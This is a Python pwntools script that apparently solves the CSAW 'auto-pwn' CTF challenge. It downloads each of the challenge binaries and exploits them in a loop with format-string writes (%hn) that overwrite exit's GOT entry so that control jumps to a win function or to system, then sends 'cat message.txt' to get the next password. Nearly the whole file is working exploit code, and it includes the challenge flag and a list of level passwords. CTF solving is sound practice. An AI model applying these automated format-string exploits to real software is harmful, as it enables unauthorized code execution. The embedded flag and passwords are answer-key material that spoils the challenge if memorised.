from pwn import *
import os
import subprocess


# flag{c0ngr4tul4t10ns,4ut0-pwn3r!5h0ut0ut5_t0_UTCTF_f0r_th31r_3xc3ll3nt_AEG_ch4ll3ng3_1n_M4y}

def get_conn(num):
    host = 'auto-pwn.chal.csaw.io'
    port = 11000 + num
    p = remote(host, port)

    # os.chdir('./binaries')
    # p = process(f'./chall{num}')
    # os.chdir('..')
    
    return p


def get_binary(num, passw):
    p = get_conn(num)
    payload = passw.encode()
    p.sendline(payload)

    line = b''
    while not line.startswith(b'-----'):
        line = p.recvline()

    file = f'hexdumps/binary_{num}.txt'
    fp = open(file, 'wb')
    line = p.recvline()
    while not line.startswith(b'-----'):
        fp.write(line)
        line = p.recvline()

    fp.close()
    p.close()
    os.system(f'xxd -r {file} binaries/chall{num}')


def pwn_chall_lvl1(p, passw, addr, value):
    fp = open('payload', 'wb')
    payload = passw.encode()
    p.sendline(payload)
    fp.write(payload + b'\n')

    payload = b'FF'
    payload += p32(addr)
    offset = (value & 0xffff) - len(payload)
    payload += f'%{offset}x'.encode()
    payload += b'%6$hn'

    p.sendline(payload)
    fp.write(payload + b'\n')
    fp.close()


def pwn_chall_lvl2(p, passw, addr, value):
    fp = open('payload', 'wb')
    payload = passw.encode()
    p.sendline(payload)
    fp.write(payload + b'\n')

    payload = b'AAAA'
    offset = (value & 0xffff) - len(payload) - 1
    payload += f'%{offset}x,'.encode()
    payload += f'%9$hn'.encode()
    payload += b'X' * (8 - len(payload) % 8)
    payload += p64(addr)

    p.sendline(payload)
    p.recvuntil(b'following:\n\n')
    fp.write(payload + b'\n')
    fp.close()


def pwn_chall_lvl4(p, passw, addr, value):
    time_str_addr = 0x40212f
    binsh = 0x2f62696e2f736800

    fp = open('payload', 'wb')
    payload = passw.encode()
    p.sendline(payload)
    fp.write(payload + b'\n')

    payload = b'AAAA'
    offset = ((binsh >> 48) & 0xffff) - len(payload) - 1
    # print(offset)
    # offset = '00001'
    payload += f'%{offset}x,'.encode()
    payload += f'%{sys.argv[1]}$hn'.encode()
    payload += b'X' * (8 - len(payload) % 8)
    payload += p64(time_str_addr)

    p.sendline(payload)
    p.recvuntil(b'following:\n\n')
    print(p.recv())
    fp.write(payload + b'\n')
    fp.close()

    p.close()
    sys.exit(0)


def search_win(elf_path):
    dump = subprocess.check_output(['objdump' ,'-M', 'intel', '-d', elf_path])
    lines = dump.decode().split('\n')
    idx = -1
    for i, line in enumerate(lines):
        if 'call' in line and '<system@plt>' in line:
            idx = i
            break
    assert idx != -1
    end_idx = idx + 1
    while 'endbr' not in lines[idx]:
        idx -= 1
    addr = lines[idx].split(':')[0].strip()
    return int(addr, 16)


def exec_chall(num, passw):
    p = get_conn(num)
    elf_path = f'binaries/chall{num}'
    elf = ELF(elf_path)
    
    if num > 45:
        pwn_chall_lvl4(p, passw, elf.got['exit'], search_win(elf_path))
    elif num > 30:
        pwn_chall_lvl2(p, passw, elf.got['exit'], search_win(elf_path))
    elif num > 15:
        pwn_chall_lvl2(p, passw, elf.got['exit'], elf.symbols['win'])
    else:
        pwn_chall_lvl1(p, passw, elf.got['exit'], elf.symbols['win'])

    p.sendline(b'cat message.txt')
    p.recvuntil(b'password ')
    r = p.recvline().decode().strip()
    p.close()
    return r


passwords = [
    'cd80d3cd8a479a18bbc9652f3631c61c',
    '4a47f4618ce3e7b567cce92b48f41e61',
    '0619b9a41fcc3e30b1e0cc206d58c37e',
    'bc53f7d2068355128e0bd28e40513d53',
    'ce3003540a75d5417d3dca0503ffeda5',
    '8bd438cc9ee6238ebecc70b7eab0be09',
    'e39e579db64ee6a1aa2c2c18079a382f',
    'b5c19ba957525075c5371b7bb0d73548',
    '0dcab2fd31d5e837270a8edaa50a72e8',
    'b62040bb6ab7c47cf2af6d2ccf64c8d4',
    'bbf1249e6c91653812ec9d4a24878048',
    'b7c1da2d7f545f4cdb9a30c26e0d0f53',
    '78c6a14fe3b8f493ca86fa47259eceb3',
    '34349f3e6d02cc9f1b1917f7b39b8c39',
    '80f5478a7fd72199229d588cd01d8c1a',
    'a60d54c8e22e29052bf16dd854d189ab',
    '5d4ebafab267f5e6f09198f5e31806e5',
    '2bca61c5430899b55eb049404990d6db',
    '7732a2722f25e4f60b06963b2d042124',
    '372a773dbec06d7573dc29e4040dbdcb',
    '463a9197365e8079e22522d76cf00e41', 
    '7122d8d420029ce6c9d005e2ca614d6e', 
    'ec3ba29810d52b706a311de1f304a034', 
    '82d03d06ca786e5d5b2ae57704c47420', 
    'a1f957dd4fe39f176f66070084071ff1', 
    'e4d2e5bdcb001c9abe3a9dc090dede2f', 
    '7393ad76ef2f99d5849de123e6fbe052', 
    '135232be9043374b7424bdb9aa9b0ca1', 
    'f0367c0f403f97e5c7af3b80d65a3880', 
    '3ca7cdd88e1b97345725287040a47c35', 
    '676b8b041ae5640ba189fe0fa12a0fe3', 
    'bae831a2f6d1434faf7e5e22d124d214',
    '8fa55a688b0eac041ab4540fa41ed375',
    '07ba5b1dd13d587d2f022990fd49ee8e',
    '54b52eabfd6ba27ab47c558e8c20e837',
    'cc122289b5a957ab517903a571500a0b',
    '80249a2e6467b65e9eebe51bc454594f',
    '55a9392e44172c416adefad16c5f9f04',
    'fd3ef3412ee269e7d2a97e3861d6bf9c',
    '3d61122569090ca104bbba2191d184de',
    '9696e39e634a4a3dbd5000331ee82827',
    '936998dc2a1ed268d18362804d341951',
    'd9a30cf55c293bc586eeb5db748ead12',
    'f0d6e6bb23f2119158f250a8c4c3e00f',
    'ccc0c5367fc75c1f2722d61607e1bea6',
    'da4939e39d3a81d85e82ecb51300c750',
    '6a84f3d7158f7458a123a021a755484d',
    'e2df03071c4eab531dba4c8084bf2d00',
    '2852346c2dbb6fa4ad42d6ffa9e72323',
    'f24893e242786db36cb37939ad0a90ff',
]

# context.log_level = 'critical'
# num = int(sys.argv[1])

for num in range(len(passwords), 50):
    passw = passwords[num - 1]
    get_binary(num, passw)
    nxt_pass = exec_chall(num, passw)
    print(num + 1, nxt_pass)
    passwords.append(nxt_pass)
